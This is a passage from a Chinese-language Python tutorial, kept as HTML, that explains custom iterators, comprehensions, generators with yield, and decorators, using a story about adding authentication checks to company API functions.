class="hljs-built_in">next</span>()函数无法调用它们。可以通过<span class="hljs-built_in">iter</span>()函数将它们转换成迭代器。<br></code></pre></td></tr></table></figure><ul><li>自定义迭代器 <ul><li>很多时候，为了让我们自己写的类成为一个迭代器，需要在类里实现<code>__iter__()</code>和<code>__next__()</code>方法 <ul><li>实际上，在使用next()函数的时候，调用的就是迭代器对象的<code>__next__</code>方法</li><li>python要求迭代器本身也是可迭代的，所以我们还要为迭代器实现<code>__iter__</code>方法，而<code>__iter__</code>方法要返回一个迭代器。 <ul><li>迭代器自身正是一个迭代器，所以迭代器的<code>__iter__</code>方法返回自身即可</li></ul></li></ul></li><li></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#迭代生成指定范围数列的平方值</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Squares</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, start, stop</span>):  <span class="hljs-comment"># 迭代起始、终止位</span><br>        <span class="hljs-variable language_">self</span>.start = start<br>        <span class="hljs-variable language_">self</span>.stop = stop<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):     <span class="hljs-comment"># 返回自身的迭代器</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):     <span class="hljs-comment"># 返回下一个元素</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.start &gt; <span class="hljs-variable language_">self</span>.stop:   <span class="hljs-comment"># 结尾时抛出异常</span><br>            <span class="hljs-keyword">raise</span> (StopIteration)<br>        item = <span class="hljs-variable language_">self</span>.start**<span class="hljs-number">2</span><br>        <span class="hljs-variable language_">self</span>.start += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> item<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Squares(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>        <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&quot; &quot;</span>)<br></code></pre></td></tr></table></figure><p><a name="55f730a2"></a></p><h3 id="推导式"><a href="#推导式" class="headerlink" title="推导式"></a>推导式</h3><ul><li>Python语言有一种独特的语法，相当于语法糖的存在，可以帮你在某些场合写出比较精简酷炫的代码。但没有它，也不会有太多的影响。Python语言有几种不同类型的推导式 <ul><li>列表推导式</li><li>字典推导式</li><li>集合推导式</li><li>元组推导式?</li></ul></li><li>列表推导式 <ul><li>列表推导式是一种快速生成列表的方式。其形式是用方括号括起来的一段语句，如下例子所示：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">alist = [x*<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)]<br><span class="hljs-built_in">print</span>(alist)<br><span class="hljs-comment">############上下两组代码是等效</span><br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    alist.append(x*<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(alist)<br></code></pre></td></tr></table></figure><ul><li>列表推导式要这么理解，首先执行for循环，对于遍历的每一个x，代入x*x表达式中进行运算，将运算结果逐一添加到一个新列表内，循环结束，得到最终列表。它相当于下面的代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">alist = []<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    alist.append(x*<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(alist)<br></code></pre></td></tr></table></figure><ul><li>作用： <ul><li>列表推导式为我们提供了一种在一行内实现较为复杂逻辑的生成列表的方法。其核心语法是用中括号[]将生成逻辑封装起来。当然列表推导式也有多样用法</li></ul></li><li>增加条件语句</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">alist = [x * x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>) <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(alist)<br><br><span class="hljs-comment">##############相当于如下代码</span><br>alist_1 = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        alist_1.append(x*x)<br><span class="hljs-built_in">print</span>(alist_1)<br></code></pre></td></tr></table></figure><ul><li>多重循环</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">re = [a+b <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;abc&#x27;</span>]<br><span class="hljs-built_in">print</span>(re)<br><br><span class="hljs-comment">#############</span><br>alist = []<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;123&#x27;</span>:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;abc&#x27;</span>:<br>        alist.append(a+b)<br><span class="hljs-built_in">print</span>(alist)<br></code></pre></td></tr></table></figure><ul><li>字典推导式 <ul><li>既然使用中括号[]可以编写列表推导式，那么使用大括号呢？你猜对了！使用大括号{}可以制造字典推导式！</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">dic = &#123;x:x**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>]&#125;<br><span class="hljs-built_in">print</span>(dic)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">dic = &#123;&#125;</span><br><span class="hljs-string">for x in [2,4,6]:</span><br><span class="hljs-string">    dic[x] = x**2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>注意x: x**2的写法，中间的冒号，表示左边的是key右边的是value。 </li><li>集合推导式 <ul><li>大括号除了能用作字典推导式，还可以用作集合推导式，两者仅仅在细微处有差别。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = &#123;x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;aabbccddeeff&#x27;</span>&#125;<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><ul><li>元组推导式 <ul><li>使用了中括号和大括号，那么使用圆括号，是不是元组推导式？想法不错，但事实却没有。圆括号在Python中被用作生成器的语法了，很快我们就会讲到，没有元组推导式。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = (x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;aabbccddeeff&#x27;</span>)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment">#&lt;generator object &lt;genexpr&gt; at 0x102f45970&gt;</span><br><span class="hljs-comment">#返回的是一个生成器对象</span><br></code></pre></td></tr></table></figure><p><a name="1a34b8d9"></a></p><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><ul><li>在Python这门语言中，生成器毫无疑问是最有用的特性之一。 </li><li>与此同时，也是使用的最不广泛的Python特性之一 </li><li>究其原因，主要是因为，在其他主流语言里面没有生成器的概念。正是由于生成器是一个“新”的东西，所以，它一方面没有引起广大工程师的重视，另一方面，也增加了工程师的学习成本，最终导致大家错过了Python中如此有用的一个特性。那到底什么是生成器呢？ </li><li>有时候，序列或集合内的元素的个数非常巨大，如果全制造出来并放入内存，对计算机的压力是非常大的。 <ul><li>比如，假设需要获取一个10**20次方如此巨大的数据序列，把每一个数都生成出来，并放在一个内存的列表内，如果使用这种粗暴的方式，你能确保你的计算机会有如此大的内存么？</li><li>那么如果元素可以按照某种算法推算出来，需要该元素的话那就计算到哪个元素，那么就可以在循环的过程中不断推算出后续的元素，而不必创建完整的元素集合，从而节省大量的空间。在Python中，这种一边循环一边计算出元素的机制，称为生成器：generator。</li><li>因此：<strong>生成器是一种特殊的迭代器，生成器自动实现了“迭代器协议”（即__iter__和next方法）</strong>，不需要再手动实现两方法。</li></ul></li><li><strong>下面，我们一起来看看如何创建一个生成器！2种方式</strong> <ul><li>生成器推导式(忽略)</li><li>for循环,yield关键字</li></ul></li><li>生成器推导式：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = (x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;aabbccddeeff&#x27;</span>)<br><span class="hljs-built_in">print</span>(a)<span class="hljs-comment">#生成器对象</span><br></code></pre></td></tr></table></figure><ul><li>可以通过next()函数获得generator的下一个返回值：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = (x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;aabbccddeeff&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(a))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(a))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(a))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">g = (x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> g:<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><ul><li>yield关键字创建生成器(重点) <ul><li>在 Python中，使用yield返回的函数会变成一个生成器（generator）。 在调用生成器的过程中，每次遇到yield时函数会暂停并保存当前所有的运行信息，返回yield的值。并在下一次执行next()方法时从当前位置继续运行。下面重点理解yield关键字的使用： <ul><li>yield 是一个类似 return 的关键字，只是这个函数返回的是个生成器</li><li>当你调用这个函数的时候，函数内部的代码并不立马执行 ，这个函数只是返回一个生成器对象</li><li>当你使用for进行遍历的时候或者调用next函数后，函数中的代码才会执行</li></ul></li><li>简单示例代码：函数体通过for循环结合yield返回一个生成器</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">createGenerator</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是循环体！&#x27;</span>)<br>        <span class="hljs-keyword">yield</span> i*i <span class="hljs-comment">#使用了yield返回的结果而不是用return</span><br>g = createGenerator()<br><span class="hljs-built_in">print</span>(g)<br><span class="hljs-comment">#&lt;generator object createGenerator at 0x104bc5970&gt;</span><br>v1 = <span class="hljs-built_in">next</span>(g)<br><span class="hljs-built_in">print</span>(v1)<br><span class="hljs-comment">#我是循环体！</span><br><span class="hljs-comment">#0</span><br>v2 = <span class="hljs-built_in">next</span>(g)<br><span class="hljs-built_in">print</span>(v2)<br><span class="hljs-comment">#我是循环体！</span><br><span class="hljs-comment">#1</span><br></code></pre></td></tr></table></figure><ul><li>思考：下述函数的执行结果是什么？</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">yieldTest</span>():<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-number">3</span>:<br>        temp = <span class="hljs-keyword">yield</span> i <span class="hljs-comment">#赋值语句一定是先执行等号右侧的，在执行等号左侧</span><br>        <span class="hljs-built_in">print</span>(temp)<br>        i += <span class="hljs-number">1</span><br>     <span class="hljs-comment">#在生成器函数实现内部是可以向yield后面写代码</span><br>        <br>obj = yieldTest()<span class="hljs-comment">#创建一个生成器对象</span><br>v1 = <span class="hljs-built_in">next</span>(obj)<br><span class="hljs-built_in">print</span>(v1) <span class="hljs-comment">#执行结果：0</span><br><br>v2 = <span class="hljs-built_in">next</span>(obj)<br><span class="hljs-built_in">print</span>(v2) <span class="hljs-comment">#执行结果：None 1</span><br></code></pre></td></tr></table></figure><p><a name="f90ead4e"></a></p><h3 id="装饰器-了解"><a href="#装饰器-了解" class="headerlink" title="装饰器(了解)"></a>装饰器(了解)</h3><ul><li>装饰器（Decorator）： <ul><li>从字面上理解，就是装饰对象的器件。 </li><li>就是可以在不修改原有代码的情况下，为被装饰的对象增加新的功能或者附加限制条件。 </li><li>装饰器有很多种，有函数的装饰器，也有类的装饰器。装饰器在很多语言中的名字也不尽相同，它体现的是设计模式中的装饰模式。 </li><li>装饰器的语法是将@装饰器名，放在被装饰对象上面。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@dec</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>  <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params">f</span>)<span class="hljs-symbol">:</span><span class="hljs-comment">#2.f == func 将被装饰函数的名字传递给参数f</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():<br>        <span class="hljs-comment">#6.执行inner函数体操作</span><br>        f() <span class="hljs-comment">#6.1.调用原先的func函数</span><br>        print(<span class="hljs-string">&#x27;注册功能&#x27;</span>) <span class="hljs-comment">#6.2 执行添加的新功能</span><br>    <span class="hljs-keyword">return</span> inner <span class="hljs-comment">#3.此处的返回值会返回给被装饰函数的名字</span><br><br><span class="hljs-variable">@outer</span>  <span class="hljs-comment">#1.调用outer装饰器函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(): <span class="hljs-comment">#4. func == inner</span><br>    print(<span class="hljs-string">&#x27;登录功能&#x27;</span>)<br><br>func() <span class="hljs-comment">#5.func() == inner()</span><br><span class="hljs-comment">#需求：给func函数增添一个注册功能</span><br></code></pre></td></tr></table></figure><ul><li>在进行装饰器的介绍之前，我们必须先明确几个概念和原则： <ul><li>首先，Python程序是从上往下顺序执行的,而且碰到函数的定义代码块是不会立即执行的，只有等到该函数被调用时，才会执行其内部的代码块</li><li>其次，由于顺序执行的原因，如果你真的对同一个函数定义了两次，那么，后面的定义会覆盖前面的定义。因此，在Python中代码的放置位置是有区别的，不能随意摆放，通常函数体要放在调用的语句之前。</li></ul></li><li>虚拟场景 <ul><li>有一个大公司，下属的基础平台部负责内部应用程序及API的开发。另外还有上百个业务部门负责不同的业务，这些业务部门各自调用基础平台部提供的不同函数，也就是API处理自己的业务，情况如下：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#基础平台部门开发了上百个函数的API</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门1的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门2的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f3</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门3的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f100</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门100的数据接口......&#x27;</span>)<br>  <br><span class="hljs-comment">#各部分分别调用自己部分的API</span><br>f1()<br>f2()<br>f3()<br>f100()<br></code></pre></td></tr></table></figure><ul><li>公司还在创业初期时，基础平台部就开发了这些函数。由于各种原因，比如时间紧，比如人手不足，比如架构缺陷，比如考虑不周等等，没有为函数的调用进行安全认证。现在，公司发展壮大了，不能再像初创时期的“草台班子”一样将就下去了，基础平台部主管决定弥补这个缺陷，于是： <ul><li>第一天：主管叫来了一个运维工程师，工程师跑上跑下逐个部门进行通知，让他们在代码里加上认证功能，然后，当天他被开除了。 </li><li>第二天：主管叫来了一个python自动化开发工程师。哥们是这么干的，只对基础平台的代码进行重构，让N个业务部门无需做任何修改。这哥们很快也被开了，连运维也没得做。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#基础平台部门开发了上百个函数的API</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br>  <span class="hljs-comment">#加入认证程序代码</span><br>  xxx<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门1的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br>  <span class="hljs-comment">#加入认证程序代码</span><br>  xxx<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门2的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f3</span>():<br>  <span class="hljs-comment">#加入认证程序代码</span><br>  xxx<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门3的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f100</span>():<br>  <span class="hljs-comment">#加入认证程序代码</span><br>  xxx<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门100的数据接口......&#x27;</span>)<br>  <br><span class="hljs-comment">#各部分分别调用自己部分的API</span><br>f1()<br>f2()<br>f3()<br>f100()<br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  第三天：主管又换了个开发工程师。他是这么干的：定义个认证函数，在原来其他的函数中调用它，代码如下:   -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#基础平台部门开发了上百个函数的API</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cheak</span>():<br>  <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br>  cheak()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门1的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br>  cheak()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门2的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f3</span>():<br>  cheak()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门3的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f100</span>():<br>  cheak()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门100的数据接口......&#x27;</span>)<br>  <br><span class="hljs-comment">#各部分分别调用自己部分的API</span><br>f1()<br>f2()<br>f3()<br>f100()<br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  但是主管依然不满意，不过这一次他解释了为什么。      - 主管说：写代码要遵循开放封闭原则，简单来说，已经实现的功能代码内部不允许被修改，但外部可以被扩展。如果将开放封闭原则应用在上面的需求中，那么就是不允许在函数f1 、f2、f3......f100的内部进行代码修改，但是可以在外部对它们进行扩展。  -  第四天：已经没有时间让主管找别人来干这活了，他决定亲自上阵，使用装饰器完成这一任务，并且打算在函数执行后再增加个日志功能。主管的代码如下：   -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params">func</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;认证功能操作&#x27;</span>)<br>    result = func()<br>    <span class="hljs-keyword">return</span> result<br>  <span class="hljs-keyword">return</span> inner<br><br><span class="hljs-comment">#基础平台部门开发了上百个函数的API</span><br><span class="hljs-meta">@outer</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门1的数据接口......&#x27;</span>)<br><span class="hljs-meta">@outer  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门2的数据接口......&#x27;</span>)<br><span class="hljs-meta">@outer</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f3</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门3的数据接口......&#x27;</span>)<br><span class="hljs-meta">@outer</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f100</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门100的数据接口......&#x27;</span>)<br>  <br><span class="hljs-comment">#各部分分别调用自己部分的API</span><br>f1()<br>f2()<br>f3()<br>f100()<br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  使用装饰器@outer，也是仅需对基础平台的代码进行拓展，就可以实现在其他部门调用函数API之前都进行认证操作，并且其他业务部门无需对他们自己的代码做任何修改，调用方式也不用变。 </code></pre><ul><li>装饰器机制分析 <ul><li>下面以f1函数为例，对装饰器的运行机制进行分析：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.定义一个装饰器</span><br><span class="hljs-comment">#装饰器outer是有特殊要求的：</span><br><span class="hljs-comment">#要求1：装饰器函数必须要有一个参数（表示的是被装饰函数的函数名）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params">func</span>): <span class="hljs-comment">#step2.func == f1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;给f1函数增添的安全认证功能&#x27;</span>)<br>        func() <span class="hljs-comment">#step3:等同于在调用f1()</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;给f1函数增加了数据检测的功能&#x27;</span>)<br>    <span class="hljs-keyword">return</span> inner<span class="hljs-comment">#step4：inner表示的是内部函数的名字，该函数名就会替换被装饰的函数名</span><br>    <span class="hljs-comment">#2.使用定义好的装饰器，去装饰某一个函数（在不修改函数原有代码的基础上给其增添新的功能）</span><br>    <span class="hljs-comment">#如果装饰器装饰了一个函数，则装饰器函数就会被自动调用</span><br><span class="hljs-meta">@outer </span><span class="hljs-comment"># step1.调用装饰器函数，且将被装饰的函数名传递给装饰器函数的参数</span><br><span class="hljs-comment">#使用outer装饰器装饰f1函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>(): <span class="hljs-comment">#step5：f1 == inner; inner()函数调用就是在调用f1()</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;业务部门1的数据接口......&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>(): <span class="hljs-comment">#f2是没有被outer装饰的</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;f2函数的原有实现&#x27;</span>)<br><br>f1() <span class="hljs-comment">#实际上就是在调用inner()</span><br></code></pre></td></tr></table></figure><ul><li>思考：为什么我们要搞一个outer函数一个inner函数这么复杂呢？一层函数不行吗？ <ul><li>请注意，@outer这句代码在程序执行到这里的时候就会自动执行outer函数内部的代码，如果不封装一下，在业务部门还未进行调用的时候，就执行了，这和初衷不符。当然，如果你对这个有需求也不是不行。</li></ul></li><li>带参装饰器 <ul><li>上面的例子中，f1函数没有参数，在实际情况中肯定会需要参数的，函数的参数怎么传递的呢？ 